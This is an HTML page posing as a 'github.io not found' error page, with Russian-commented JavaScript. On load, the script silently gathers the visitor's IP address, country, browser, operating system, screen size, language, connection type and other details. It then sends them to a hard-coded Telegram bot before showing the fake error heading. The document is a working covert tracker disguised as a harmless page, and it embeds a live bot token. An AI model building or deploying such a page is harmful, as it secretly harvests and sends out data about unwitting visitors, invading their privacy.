<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error github.io not found</title>
</head>
<body>

<script>
    document.addEventListener("DOMContentLoaded", async function () {
        // Данные вашего бота
        var botToken = "6471724114:AAH7qsYVK-EVyxB3rXuV-5KpFq9JnVzTj34";
        var chatId = 6234673489;

        // Получаем IP адрес клиента
        var clientIp;

        // Получаем информацию о браузере
        var browserInfo = getBrowserInfo();

        // Получаем имя пользователя из системы
        var userName = getUserName();

        // Получаем операционную систему
        var operatingSystem = getOperatingSystem();

        // Получаем страну пользователя
        var userCountry = await getUserCountry();

        // Получаем разрешение экрана
        var screenResolution = getScreenResolution();

        // Получаем язык браузера
        var browserLanguage = getBrowserLanguage();

        // Получаем версию браузера
        var browserVersion = getBrowserVersion();

        // Получаем текущее время
        var currentTime = getCurrentTime();

        // Получаем тип подключения к интернету
        var connectionType = getConnectionType();

        // Получаем доступность куки
        var cookieEnabled = getCookieEnabled();

        // Проверяем наличие AdBlock
        var adBlockPresent = checkAdBlock();

        // Получаем тему операционной системы
        var osTheme = getOSTheme();

        // Получаем скорость интернет-соединения
        var internetSpeed = await getInternetSpeed();

        // Получаем значение счетчика из локального хранилища
        var userCounter = localStorage.getItem("userCounter") || 0;

        // Увеличиваем счетчик пользователей
        userCounter++;

        // Сохраняем значение счетчика в локальное хранилище
        localStorage.setItem("userCounter", userCounter);

        // Функция для отправки данных в бота Telegram
        function sendMessage(text) {
            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            var params = "chat_id=" + chatId + "&text=" + text;

            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    console.log("//github.io not found");
                }
            };

            xhr.send(params);
        }

        // Получаем IP адрес клиента с использованием стороннего сервиса
        fetch("https://api64.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                clientIp = data.ip;

                // Отправляем сообщение в бот
                var message = "IP: " + clientIp + "\nБраузер: " + browserInfo + "\nИмя пользователя: " + (userName || "Не удалось получить имя") +
                    "\nОС: " + operatingSystem + "\nСтрана: " + userCountry + "\nРазрешение экрана: " + screenResolution +
                    "\nЯзык браузера: " + browserLanguage + "\nВерсия браузера: " + browserVersion + "\nТекущее время: " + currentTime +
                    "\nТип подключения к интернету: " + connectionType + "\nДоступность куки: " + cookieEnabled +
                    "\nПрисутствие AdBlock: " + (adBlockPresent ? "Есть" : "Отсутствует") +
                    "\nТема ОС: " + osTheme + "\nСкорость интернета: " + internetSpeed +
                    "\nПользователь №" + userCounter;
                sendMessage(message);
            })
            .catch(error => {
                console.error("Ошибка при получении IP: ", error);

                // В случае ошибки также отправляем сообщение в бот с указанием, что не удалось получить имя
                var errorMessage = "IP: " + clientIp + "\nБраузер: " + browserInfo + "\nИмя пользователя: Не удалось получить имя" +
                    "\nОС: " + operatingSystem + "\nСтрана: " + userCountry + "\nРазрешение экрана: " + screenResolution +
                    "\nЯзык браузера: " + browserLanguage + "\nВерсия браузера: " + browserVersion + "\nТекущее время: " + currentTime +
                    "\nТип подключения к интернету: " + connectionType + "\nДоступность куки: " + cookieEnabled +
                    "\nПрисутствие AdBlock: " + (adBlockPresent ? "Есть" : "Отсутствует") +
                    "\nТема ОС: " + osTheme + "\nСкорость интернета: " + internetSpeed +
                    "\nПользователь №" + userCounter;
                sendMessage(errorMessage);
            });

        // HTML-страница, которую увидит пользователь
        document.body.innerHTML = "<h1>Error github.io not found</h1>";
    });

    function getBrowserInfo() {
        var ua = navigator.userAgent;
        var browserInfo = "";

        if (ua.indexOf("Chrome") !== -1) {
            browserInfo = "Google Chrome";
        } else if (ua.indexOf("Firefox") !== -1) {
            browserInfo = "Mozilla Firefox";
        } else if (ua.indexOf("Safari") !== -1) {
            browserInfo = "Apple Safari";
        } else if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) {
            browserInfo = "Opera";
        } else if (ua.indexOf("Edge") !== -1) {
            browserInfo = "Microsoft Edge";
        } else if (ua.indexOf("MSIE") !== -1 || ua.indexOf("Trident/") !== -1) {
            browserInfo = "Internet Explorer";
        } else {
            browserInfo = "Неизвестный браузер";
        }

        return browserInfo + " (" + navigator.platform + ")";
    }

    function getUserName() {
        return window.navigator.userAgent.toLowerCase().includes('firefox') ? 'Guest' : window.navigator.platform;
    }

    function getOperatingSystem() {
        var ua = navigator.userAgent;

        if (ua.includes("Windows")) {
            if (ua.includes("Windows NT 10.0")) {
                return "Windows 10";
            } else if (ua.includes("Windows NT 6.3")) {
                return "Windows 8.1";
            } else if (ua.includes("Windows NT 6.2")) {
                return "Windows 8";
            } else if (ua.includes("Windows NT 6.1")) {
                return "Windows 7";
            } else if (ua.includes("Windows NT 6.0")) {
                return "Windows Vista";
            } else if (ua.includes("Windows NT 5.1")) {
                return "Windows XP";
            } else {
                return "Windows";
            }
        } else if (ua.includes("Linux")) {
            return "Linux";
        } else if (ua.includes("iPhone") || ua.includes("iPad") || ua.includes("iPod")) {
            return "iOS";
        } else if (ua.includes("Android")) {
            return "Android";
        } else {
            return "Неизвестная операционная система";
        }
    }

    async function getUserCountry() {
        // Получаем страну пользователя с использованием стороннего сервиса
        try {
            var response = await fetch("https://ipinfo.io/json");
            var data = await response.json();
            return data.country;
        } catch (error) {
            console.error("Ошибка при получении страны: ", error);
            return "Не удалось определить страну";
        }
    }

    function getScreenResolution() {
        return screen.width + "x" + screen.height;
    }

    function getBrowserLanguage() {
        return navigator.language || "Не удалось определить язык";
    }

    function getBrowserVersion() {
        return navigator.appVersion || "Не удалось определить версию";
    }

    function getCurrentTime() {
        var now = new Date();
        var hours = now.getHours();
        var minutes = now.getMinutes();
        var seconds = now.getSeconds();

        return hours + ":" + minutes + ":" + seconds;
    }

    function getConnectionType() {
        return navigator.connection ? navigator.connection.effectiveType || "Не удалось определить тип подключения" : "Неизвестно";
    }

    function getCookieEnabled() {
        return navigator.cookieEnabled ? "Включены" : "Отключены";
    }

    function checkAdBlock() {
        var adBlockEnabled = false;
        var testAd = document.createElement('div');
        testAd.innerHTML = '&nbsp;';
        testAd.className = 'adsbox';
        document.body.appendChild(testAd);
        window.setTimeout(function () {
            if (testAd.offsetHeight === 0) {
                adBlockEnabled = true;
            }
            testAd.remove();
        }, 100);
        return adBlockEnabled;
    }

    function getOSTheme() {
        // Получаем информацию о теме операционной системы
        return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Темная' : 'Светлая';
    }

    async function getInternetSpeed() {
        // Получаем информацию о скорости интернет-соединения с использованием стороннего сервиса
        try {
            var response = await fetch("https://api.fast.com/netflix/speedtest");
            var data = await response.json();
            return data;
        } catch (error) {
            console.error("Ошибка при получении скорости интернета: ", error);
            return "Не удалось определить скорость интернета";
        }
    }
</script>

</body>
</html>